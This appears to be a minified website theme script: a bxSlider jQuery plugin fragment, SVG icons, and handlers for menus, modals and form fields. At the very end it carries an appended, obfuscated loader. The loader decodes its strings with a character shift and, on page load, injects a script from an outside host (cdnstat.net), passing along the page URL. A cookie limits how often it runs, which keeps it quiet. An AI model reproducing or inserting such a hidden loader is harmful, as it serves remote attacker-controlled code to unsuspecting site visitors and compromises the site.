> .bx-clone").eq(n.settings.maxSlides).position(),n.active.last=!1):t>=0&&(l=t*parseInt(v()),d=n.children.eq(l).position()),void 0!==d&&(r="horizontal"===n.settings.mode?-(d.left-h):-d.top,x(r,"slide",n.settings.speed)),n.working=!1),n.settings.ariaHidden&&K(n.active.index*v())}},o.goToNextSlide=function(){if((n.settings.infiniteLoop||!n.active.last)&&!0!==n.working){var e=parseInt(n.active.index)+1;o.goToSlide(e,"next")}},o.goToPrevSlide=function(){if((n.settings.infiniteLoop||0!==n.active.index)&&!0!==n.working){var e=parseInt(n.active.index)-1;o.goToSlide(e,"prev")}},o.startAuto=function(e){n.interval||(n.interval=setInterval((function(){"next"===n.settings.autoDirection?o.goToNextSlide():o.goToPrevSlide()}),n.settings.pause),n.settings.onAutoChange.call(o,!0),n.settings.autoControls&&!0!==e&&M("stop"))},o.stopAuto=function(e){n.autoPaused&&(n.autoPaused=!1),n.interval&&(clearInterval(n.interval),n.interval=null,n.settings.onAutoChange.call(o,!1),n.settings.autoControls&&!0!==e&&M("start"))},o.getCurrentSlide=function(){return n.active.index},o.getCurrentSlideElement=function(){return n.children.eq(n.active.index)},o.getSlideElement=function(e){return n.children.eq(e)},o.getSlideCount=function(){return n.children.length},o.isWorking=function(){return n.working},o.redrawSlider=function(){n.children.add(o.find(".bx-clone")).outerWidth(f()),n.viewport.css("height",p()),n.settings.ticker||w(),n.active.last&&(n.active.index=g()-1),n.active.index>=g()&&(n.active.last=!0),n.settings.pager&&!n.settings.pagerCustom&&(C(),I(n.active.index)),n.settings.ariaHidden&&K(n.active.index*v())},o.destroySlider=function(){n.initialized&&(n.initialized=!1,e(".bx-clone",this).remove(),n.children.each((function(){void 0!==e(this).data("origStyle")?e(this).attr("style",e(this).data("origStyle")):e(this).removeAttr("style")})),void 0!==e(this).data("origStyle")?this.attr("style",e(this).data("origStyle")):e(this).removeAttr("style"),e(this).unwrap().unwrap(),n.controls.el&&n.controls.el.remove(),n.controls.next&&n.controls.next.remove(),n.controls.prev&&n.controls.prev.remove(),n.pagerEl&&n.settings.controls&&!n.settings.pagerCustom&&n.pagerEl.remove(),e(".bx-caption",this).remove(),n.controls.autoEl&&n.controls.autoEl.remove(),clearInterval(n.interval),n.settings.responsive&&e(window).off("resize",q),n.settings.keyboardEnabled&&e(document).off("keydown",N),e(this).removeData("bxSlider"),e(window).off("blur",F).off("focus",$))},o.reloadSlider=function(t){void 0!==t&&(s=t),o.destroySlider(),l(),e(o).data("bxSlider",this)},l(),e(o).data("bxSlider",this),this}}}(jQuery);var svg_close='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 13.41 13.41"><path d="M-.001 1.414L1.413 0l12 12-1.414 1.413z"/><path d="M-.001 12.006l12-12 1.414 1.415-12 12z"/></svg>',svg_triangle_down='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6"><defs><style>.\\31 f201350-b032-4c0e-948f-3aae7ce288d3{fill:#231f20}</style></defs><g id="3bc60b5a-98d3-4b4d-b712-a4a397235cee"><path id="9ad1f587-fcee-4a70-9108-ce7a6ea1e6a8" d="M12 0L6 6 0 0h12z" class="1f201350-b032-4c0e-948f-3aae7ce288d3"/></g></svg>',svg_plus='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18"><path d="M0 8h18v2H0z"/><path d="M8 18V0h2v18z"/></svg>',svg_minus='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 2"><path d="M0 0h18v2H0z"/></svg>',svg_check='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.48 13.12"><defs><style>.f10d46a1-5df6-40bf-8547-f79466edf340{fill:#231f20}</style></defs><path d="M5.78 13.12L0 7.34l1.41-1.41 4.22 4.21L13.93 0l1.55 1.27-9.7 11.85z" class="f10d46a1-5df6-40bf-8547-f79466edf340"/></svg>',svg_spinner='<svg xmlns="http://www.w3.org/2000/svg" class="lds-rolling" preserveAspectRatio="xMidYMid" style="animation-play-state:paused;animation-delay:-.9s;background:0 0" viewBox="0 0 100 100"><circle cx="50" cy="50" r="35" fill="none" stroke="#000" stroke-dasharray="164.934 56.978" stroke-width="10" style="animation-play-state:paused;animation-delay:-.9s" transform="rotate(26.667 50 50)"><animateTransform attributeName="transform" begin="0s" calcMode="linear" dur="0.9s" keyTimes="0;1" repeatCount="indefinite" type="rotate" values="0 50 50;360 50 50"/></circle></svg>',svg_arrow='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 10"><g><g><polygon points="26 5 21 0 21 10 26 5"/><rect width="23" height="2" y="4"/></g></g></svg>';$(document).ready((function(){function e(){var e=$(".modal.active");if(e.length){e.fadeOut(n).removeClass("active");var t=$("body").css("top");t=(t=t.replace("-","")).replace("px",""),$("body").removeClass("modal-lock-scroll").removeAttr("style"),$("html, body").scrollTop(t),e.find("iframe").each((function(){var e=$(this).attr("src");$(this).attr("src",e)}))}}function t(){$("select").attr("data-jcf",'{"wrapNative": false, "wrapNativeOnMobile": false, "fakeDropInBody": false, "multipleCompactStyle": true}'),$("[data-range-vertical]").attr("data-jcf",'{"orientation": "vertical"}'),$(".woocommerce-checkout select, .woocommerce-edit-address select").addClass("jcf-ignore"),jcf.replaceAll(),$(".jcf-icon").remove(),$(".jcf-select-opener").append('<span class="jcf-icon">'+svg_triangle_down+"</span>"),$(".jcf-btn-inc").append('<span class="jcf-icon">'+svg_plus+"</span>"),$(".jcf-btn-dec").append('<span class="jcf-icon">'+svg_minus+"</span>"),$(".jcf-checkbox span").append('<span class="jcf-icon">'+svg_check)}function s(){$(".gform_button").on("click",(function(){var e=$(this),t=e.attr("data-gf-id");e.addClass("btn--has-loader").append('<span class="btn__loader">'+svg_spinner+"</span>"),$("html, body").animate({scrollTop:$("#gform_wrapper_"+t+", #form-top-"+t).offset().top-50},500)})),$(".gform_wrapper .validation_error").prepend("<h4>Error</h4><br>")}function i(){$('.gform_wrapper input[type="text"], .gform_wrapper input[type="email"], .gform_wrapper input[type="tel"]').each((function(){$(this).closest(".gfield").addClass("field-label-overlap"),$(this).val()&&$(this).closest(".gfield").addClass("field-label-overlap--focus")})),$(document).on("focus",".field-label-overlap input",(function(){$(this).closest(".field-label-overlap").addClass("field-label-overlap--focus")})),$(document).on("focusout",".field-label-overlap input",(function(){$(this).val()||$(this).closest(".field-label-overlap").removeClass("field-label-overlap--focus")}))}var n=250;("ontouchstart"in window||(navigator.msMaxTouchPoints||navigator.maxTouchPoints)>2)&&$("body").removeClass("no-touch"),$("body").removeClass("no-js"),$(".page-wrap").removeClass("page-loading-in"),$(".page-wrap").addClass("page-loaded"),$('a:not([href*="#"]):not([download]):not([target])').on("click",(function(e){e.preventDefault();var t=this.href;$(".page-wrap").addClass("page-loading-out"),$(".page-wrap").removeClass("page-loaded"),$(".page-wrap").addClass("lock-scroll"),window.location.href=t}));var o,a,r=$("body"),l=r.offset().top;$(window).on("load scroll",(function(){(o=window.pageYOffset)>l?(r.removeClass("site-scroll--inactive"),r.addClass("site-scroll--active")):(r.removeClass("site-scroll--active"),r.addClass("site-scroll--inactive"))})),$(".js-toggle-menu").on("click",(function(e){e.preventDefault(),$(this).toggleClass("active"),$(".site-menu-overlay").fadeToggle(n),$(".site-menu-overlay").toggleClass("active"),$("body").toggleClass("lock-scroll menu-open")})),$(window).on("resize",(function(){$(this).width()>1024&&($(".js-toggle-menu").removeClass("active"),$(".site-menu-overlay").css("display",""),$("body").removeClass("lock-scroll menu-open"))})),$(".modal").prepend('<div class="modal__overlay"></div>'),$(".modal__inner").append('<a class="modal__close" href="#">'+svg_close+"</a>"),$("[data-modal-target]").on("click",(function(e){e.preventDefault();var t=$(this).attr("data-modal-target");$('[data-modal="'+t+'"]').length&&($('[data-modal="'+t+'"]').fadeIn(n).addClass("active"),$("body").css("top",-window.pageYOffset).addClass("modal-lock-scroll"))})),$(".modal__close, .modal__close *, .modal__overlay").on("click",(function(t){t.preventDefault(),e()})),$(document).keyup((function(t){27==t.keyCode&&e()})),$(window).on("load",(function(){$(".js-work-slider").bxSlider({mode:"horizontal",prevText:svg_arrow,nextText:svg_arrow,adaptiveHeight:!0,touchEnabled:!1,onSliderLoad:function(){$(".bxslider--loading").removeClass("bxslider--loading")}}),$(".js-number-slider").bxSlider({mode:"fade",controls:!1,adaptiveHeight:!0,touchEnabled:!1,speed:500,onSliderLoad:function(){$(".bxslider--loading").removeClass("bxslider--loading")}})})),$("iframe").wrap('<div class="fitvids-container"></div>'),$(".fitvids-container").fitVids(),t(),$(document).ajaxComplete((function(){t()})),$(".datepicker").attr("autocomplete","off"),$(document).bind("gform_post_render",(function(){i(),s(),t()})),s(),$(document).on("click",".jcf-option, .gform_wrapper .datepicker, .ui-datepicker-prev, .ui-datepicker-next",(function(){t()})),i(),$(".js-smooth-scroll").on("click",(function(e){e.preventDefault();var t=$(".site-header").outerHeight(),s=$(this).attr("href");$(s).length&&$("html, body").animate({scrollTop:$(s).offset().top-t},450)})),$(".js-popup").on("click",(function(e){e.preventDefault(),function(e,t,s,i){var n=void 0!==window.screenLeft?window.screenLeft:screen.left,o=void 0!==window.screenTop?window.screenTop:screen.top,a=(window.innerWidth?window.innerWidth:document.documentElement.clientWidth?document.documentElement.clientWidth:screen.width)/2-s/2+n,r=(window.innerHeight?window.innerHeight:document.documentElement.clientHeight?document.documentElement.clientHeight:screen.height)/3-i/3+o,l=window.open(e,t,"scrollbars=yes, width="+s+", height="+i+", top="+r+", left="+a);window.focus&&l.focus()}($(this).attr("href"),$(this).find(".text").html(),580,470)})),$(".site-footer__location-title").on("click",(function(){$(window).width()<=760&&($(this).parent().parent().find(".site-footer__address, .site-footer__location-links").slideToggle(),$(this).toggleClass("active"))})),$(window).on("resize",(function(){$(this).width()>670&&($(".site-footer__location-title").removeClass("active"),$(".site-footer__address, .site-footer__location-links").css("display",""))})),$(window).on("load resize",(function(){a=$(window).width()>1440?200:$(window).width()<350?10:50})),$('[data-animate="load"]').addClass("animated"),$(window).on("scroll load",(function(){var e=o+$(window).innerHeight();$('[data-animate="scroll"]').each((function(){e-$(this).offset().top>a?$(this).addClass("animated"):$(this).removeClass("animated")}))})),$(window).on("scroll load",(function(){$(window).width()>1024&&($(".hex-img .hex-img__graphic").each((function(){var e=$(this).parent();if(o>e.offset().top-$(window).innerHeight()&&o<e.offset().top+e.innerHeight()){var t=(e.offset().top-o)/10;$(this).css("top",t)}})),$(".site-banner--archive .site-banner__graphic-1").each((function(){$(this).css("top",o/4+80)})),$(".site-banner--archive .site-banner__graphic-2").each((function(){$(this).css("top",o/12+150)})))})),void 0===document.createElement("div").style.objectFit&&(console.log("Object Fit not supported by browser"),$(".js-object-fit").each((function(){imgUrl=$(this).prop("src"),$(this).css("opacity",0).parent().css({"background-image":"url("+imgUrl+")","background-size":"cover","background-position":"center center"})}))),$(window).on("load",(function(){$(".post-styles table").wrap('<div class="table-wrap"></div>')})),$(".woocommerce-checkout .clear").remove()}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));